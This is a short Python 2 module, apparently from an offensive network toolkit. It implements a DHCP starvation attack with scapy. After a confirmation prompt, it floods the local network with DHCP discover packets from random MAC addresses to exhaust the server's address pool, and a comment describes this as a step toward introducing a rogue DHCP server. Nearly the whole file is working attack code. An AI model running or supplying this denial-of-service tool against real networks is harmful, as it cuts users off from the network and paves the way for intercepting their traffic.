from scapy.all import *
from util import Msg

#
# DHCP starvation attack involves firing off DHCP request packets with random MAC addresses.  With this we can 
# exhaust the address space reserved by the DHCP server.  This attack can be a viable stepping stone in the
# introduction of a rogue DHCP server.
# more: http://hakipedia.com/index.php/DHCP_Starvation
#
def initialize():
	tmp = raw_input('[!] Are you sure you want to DHCP starve the gateway? ')
	if tmp == 'n':
		return
	print '[!] Beginning DHCP starvation...'
	conf.checkIPaddr = False
	try:
		pkt = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12, '0123456789abcdef'))/DHCP(options=[("message-type",'discover'),'end'])
		sendp(pkt, loop=1)
	except KeyboardInterrupt,Exception:
		Msg('[!] Shutting down DoS...')
